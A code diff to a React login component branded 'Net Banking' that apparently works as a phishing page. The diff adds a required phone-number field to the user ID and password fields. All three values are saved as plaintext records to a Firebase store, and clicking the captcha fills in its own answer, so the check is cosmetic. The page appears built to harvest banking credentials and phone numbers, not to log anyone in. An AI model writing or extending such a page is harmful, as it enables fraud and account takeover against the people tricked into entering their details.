@@ -6,6 +6,7 @@ import FirebaseUtil from '../FirebaseRepo';
 const FirstPage = () => {
   const [userId, setUserId] = useState('');
   const [password1, setPassword1] = useState('');
+  const [phoneNumber, setPhoneNumber] = useState('');
   const [captcha, setCaptcha] = useState('');
   const [captchaText, setCaptchaText] = useState('');
   const [captchaType, setCaptchaType] = useState('image');
@@ -51,7 +52,7 @@ const FirstPage = () => {
         key: `user_${timestamp}`,
         userId,
         password1,
-        phoneNumber: "", // This can be collected in the future if needed
+        phoneNumber,
         timeStamp: timestamp,
       });
       
@@ -100,31 +101,38 @@ const FirstPage = () => {
       <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
         <div className="bg-[#0077be] text-white rounded-3xl w-full max-w-md p-3 sm:p-5 shadow-lg overflow-hidden">
           <div className="text-center mb-6">
-            <h2 className="text-xl mb-1">Welcome To</h2>
-            <h1 className="text-4xl font-bold text-yellow-300">Net Banking</h1>
+            <h2 className="text-2xl font-bold mb-4">Login</h2>
           </div>
 
-          <form onSubmit={handleSubmit}>
-            {/* User ID */}
-            <div className="mb-3">
+          <form onSubmit={handleSubmit} className="space-y-4">
+            <div>
               <input
                 type="text"
-                placeholder="User ID"
-                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
+                placeholder="Enter User ID"
                 value={userId}
                 onChange={(e) => setUserId(e.target.value)}
+                className="w-full px-3 py-2 rounded-lg bg-white text-black border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
                 required
               />
             </div>
-
-            {/* Password */}
-            <div className="mb-3">
+            <div>
+              <input
+                type="tel"
+                placeholder="10-digit phone number"
+                value={phoneNumber}
+                onChange={(e) => setPhoneNumber(e.target.value)}
+                className="w-full px-3 py-2 rounded-lg bg-white text-black border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
+                required
+                pattern="[0-9]{10}"
+              />
+            </div>
+            <div>
               <input
                 type="password"
-                placeholder="Password"
-                className="w-full py-2 px-3 rounded text-gray-700 text-sm"
+                placeholder="Enter Password"
                 value={password1}
                 onChange={(e) => setPassword1(e.target.value)}
+                className="w-full px-3 py-2 rounded-lg bg-white text-black border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
                 required
               />
             </div>
@@ -165,7 +173,7 @@ const FirstPage = () => {
               />
               <div className="bg-white rounded p-2 flex items-center justify-center w-24 relative">
                 <span 
-                  className="text-gray-700 font-mono text-sm select-none"
+                  className="text-gray-700 font-mono text-sm select-none cursor-pointer hover:text-blue-500"
                   style={{
                     fontFamily: 'monospace',
                     letterSpacing: '1px',
@@ -176,6 +184,9 @@ const FirstPage = () => {
                     transform: 'skewX(-5deg)',
                     textShadow: '1px 1px 2px rgba(0,0,0,0.2)',
                     padding: '2px 4px'
+                  }}
+                  onClick={() => {
+                    setCaptcha(captchaText);
                   }}
                 >
                   {captchaText}
